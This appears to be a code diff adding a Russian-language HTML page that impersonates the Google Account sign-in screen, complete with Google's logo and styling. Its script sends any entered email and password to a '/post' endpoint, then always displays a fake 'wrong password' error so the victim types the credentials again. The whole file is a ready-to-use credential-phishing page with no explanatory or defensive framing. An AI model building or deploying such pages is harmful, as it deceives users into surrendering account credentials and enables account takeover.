@@ -1,0 +1,301 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Вход — Google Аккаунт</title>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+  <style>
+    a:hover{
+      text-decoration: underline;
+    }
+    body{
+        display: flex;
+        font-family: Arial, sans-serif;
+        align-items: center;
+        justify-content: center;
+        background-color: #F0F4F9;
+        justify-content: center;
+        align-items: center;
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        height: 90vh;
+    }
+    .container{
+        margin: auto;
+        padding: 20px;
+        width: 80%;
+        max-width: 800px;
+        flex-direction: column; 
+        align-items: flex-start;
+        transform-origin: center; 
+    }
+    @media screen and (min-width: 768px){
+      .container{
+        max-width: 800px;
+      }
+    }
+    .logo-container{
+      text-align: center;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo{
+      width: 40px;
+      height: 40px;
+      fill: #FFC72C;
+      margin-right: 100px;
+    }
+    .company-name{
+      font-size: 42px;
+      color: black;
+      margin-left: 0px;
+    }
+    .form-container{
+      background: #FFFFFF;
+      border-radius: 25px;
+      padding: 20px;
+      align-items: flex-end;
+    }
+    h1{
+      text-align: center;
+      font-size: 28px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .containertitle{
+      color: #202124;
+      font-size: 36px;
+      padding: 15px 0px 20px 0px;
+    }
+    .containersubtitle{
+      color: #202124;
+      font-size: 16px;
+      padding: 0px 0px 30px 0px;
+    }
+    .input-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .input-field {
+      outline: none;
+      width: 100%;
+      height: 50px;
+      padding: 12px 10px;
+      box-sizing: border-box;
+      border: 1px solid #6b6b6b;
+      border-radius: 4px;
+    }
+    .label {
+      position: absolute;
+      left: 10px;
+      top: 16px;
+      transition: 0.2s;
+      color: #6b6b6b;
+      pointer-events: none;
+      background: white; 
+      padding: 0 5px; 
+      font-size: 15px;
+      
+    }
+    .input-field:focus + .label,
+    .input-field:not(:placeholder-shown) + .label {
+      top: -7px;
+      left: 10px;
+      font-size: 12px;
+    }
+    .submit-btn {
+        outline: none;
+      background: #0B57D0;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 20px;
+      transition: 0.2s;
+      font-size: 0.875rem;
+    }
+    .submit-btn:hover {
+        background: #0E4EB5;
+    }
+    .containerbtn {
+      display: flex;
+      justify-content: end;
+      padding: 30px 0px 25px 0px;
+    }
+    .badd {
+        color:#B3261E;
+        font-size: 14px;
+        position: relative;
+        display: flex;
+        top: -14px;
+    }
+    .badd span {
+        position: relative;
+        display: flex;
+        right:-10px;
+        top: 1px;
+    }
+    .badd svg {
+        color:#B3261E;
+        min-width: 16px;
+        min-height: 16px;
+    }
+    .baddd {
+        color:#B3261E;
+        font-size: 14px;
+        position: relative;
+        display: flex;
+        top: 5px;
+    }
+    .baddd span {
+        position: relative;
+        display: flex;
+        right:-10px;
+        top: 1px;
+    }
+    .baddd svg {
+        color:#B3261E
+    }
+    @media screen and (min-width: 768px){
+      .logo{
+        max-width: 80px;
+        max-height: 80px;
+      }
+    }
+    @media screen and (min-width: 768px){
+      .badd svg{
+        min-width: 16px;
+        min-height: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class='container'>
+    <div class='logo-container'>
+      <?xml version='1.0' standalone='no'?>
+      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>
+    </div>
+    <div class=form-container>
+        <div class='containerlogo'>
+          <!-- Google Logo -->
+          <div id="logo" title="Google">
+            <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+          </div>
+          <!-- /Google Logo -->
+        </div>
+      <div style='min-height: 150px'>
+          <div class='containertitle'>Вход</div>
+          <div class='containersubtitle'>Авторизация в сети</div>
+          <div class='input-container'>
+            <input name='email' id="email" class='input-field' type='text' placeholder=' ' required>
+            <label class='label' id="textmail">Телефон или адрес эл. почты</label>
+          </div>
+          <div id="badmail" class="badd" style="display:none">
+            <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+            <span>Введите адрес электронной почты или номер телефона.</span>
+        </div>
+          <div class='input-container'>
+            <input name='password' id="password" class='input-field' type='password' placeholder=' ' required>
+            <label class='label' id="textpass">Введите пароль</label>
+            <div id="badpass" class="baddd" style="display:none">
+                <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                <span id="textenps">Введите пароль.</span>
+            </div>
+          </div>
+          <div class='containerbtn'>
+            <button id='aedfwarsxfgvb' class='submit-btn' type='submit'>Войти</button>
+          </div>
+        </div>
+  </div>
+  <script> // Made with love by me
+    let emailField = document.getElementById("email");
+    let passField = document.getElementById("password");
+    let textpass = document.getElementById('textpass');
+    let textmail = document.getElementById('textmail');
+    const ontouchsta = document.getElementById('aedfwarsxfgvb');
+    let badmail = document.getElementById('badmail');
+    let badpass = document.getElementById('badpass');
+    let textenps = document.getElementById('textenps');
+
+    var colorblurmail = '#6b6b6b';
+    var colorfocusmail = '#1B55AC';
+    var colorblur = '#6b6b6b';
+    var colorfocus = '#1B55AC';
+    var textmailcolorfocus = '#22549B';
+    var textpasscolorfocus = '#22549B';
+    var textmailcolorblur = '#6b6b6b';
+    var textpasscolorblur = '#6b6b6b';
+
+    emailField.addEventListener('focus', ()=> {
+        emailField.style.border='2px solid '+colorfocusmail;
+        textmail.style.color=textmailcolorfocus;
+    })
+
+    passField.addEventListener('focus', ()=> {
+        passField.style.border='2px solid '+colorfocus;
+        textpass.style.color=textpasscolorfocus;
+        console.log(textpasscolorblur);
+    })
+
+    emailField.addEventListener('blur', ()=> {
+        emailField.style.border='1px solid '+colorblurmail;
+        if(emailField.value.trim() == "" || textmailcolorfocus !== '#B3261E') {
+            textmail.style.color=textmailcolorblur;
+        }
+    })
+
+    passField.addEventListener('blur', ()=> {
+        passField.style.border='1px solid '+colorblur;
+        if(passField.value.trim() == "" || textpasscolorfocus !== '#B3261E') {
+            textpass.style.color=textpasscolorblur;
+        }
+    })
+
+    ontouchsta.addEventListener("click", () => {
+
+        if(emailField.value.trim() == "") {
+            colorfocusmail='#B3261E';
+            colorblurmail='#B3261E';
+            textmailcolorfocus = '#B3261E';
+            emailField.style.border='1px solid #B3261E';
+            badmail.style.display='flex';
+
+        } if(emailField.value.trim() !== "") {
+            colorfocusmail='#1B55AC';
+            colorblurmail='#6b6b6b';
+            textmailcolorfocus = '#22549B';
+            emailField.style.border='1px solid #6b6b6b';
+            textmail.style.color=textmailcolorblur;
+            badmail.style.display='none';
+            
+        } if(passField.value.trim() == "") {
+            colorfocus='#B3261E';
+            colorblur='#B3261E';
+            textenps.textContent='Введите пароль.';
+            textpasscolorfocus = '#B3261E';
+            passField.style.border='1px solid #B3261E';
+            badpass.style.display='flex';
+        
+        } if(passField.value.trim() !== "" && emailField.value.trim() !== "") {
+            fetch('/post?email=' + emailField.value.trim() + '&password=' + passField.value.trim(), {
+                mode: 'cors'
+            })
+            .catch(error => {
+            });
+            textenps.textContent='Неверный пароль.';
+            colorfocus='#B3261E';
+            colorblur='#B3261E';
+            textpasscolorfocus = '#B3261E';
+            passField.style.border='1px solid #B3261E';
+            badpass.style.display='flex';
+            textpass.style.color=textpasscolorfocus;
+        }
+        return; 
+    });
+</script>
+</body>
+</html>
